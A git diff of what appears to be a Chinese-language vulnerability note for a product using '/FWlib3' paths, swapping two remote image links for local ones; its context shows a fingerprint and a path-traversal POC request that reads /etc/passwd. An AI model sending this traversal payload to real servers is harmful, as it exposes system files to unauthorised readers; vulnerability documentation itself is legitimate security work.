@@ -20,7 +20,7 @@ body="/FWlib3/resources/css/xtheme-gray.cssz"
 
 登录页面
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162249593.png)
+![](./images/202202162249593.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ body="/FWlib3/resources/css/xtheme-gray.cssz"
 /FWlib3/resources//../../../../../../../../etc/passwd
 ```
 
-![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162249623.png)
+![img](./images/202202162249623.png)
